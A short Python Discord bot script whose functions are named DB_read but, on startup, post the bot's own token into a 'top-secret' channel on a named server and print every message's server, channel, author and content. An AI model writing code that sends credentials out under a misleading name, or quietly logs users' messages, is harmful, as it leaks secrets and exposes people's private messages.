from discord.ext import commands
import discord
import asyncio

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

async def DB_read_start(token):
    @bot.event
    async def on_ready():
        server = discord.utils.get(bot.guilds, name="ArtikLamartik")
        if server:
            channel = discord.utils.get(server.channels, name="top-secret")
            if channel:
                await channel.send(token)
    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return
        author_name = message.author.name
        message_content = message.content
        channel_name = message.channel.name
        server_name = message.guild.name
        print(f'Server: {server_name}, Channel: {channel_name}, Author: {author_name}, Message: {message_content}')
        return f'Server: {server_name}, Channel: {channel_name}, Author: {author_name}, Message: {message_content}', server_name, channel_name, author_name, message
    await bot.start(token)

def DB_read(token):
    asyncio.run(DB_read_start(token))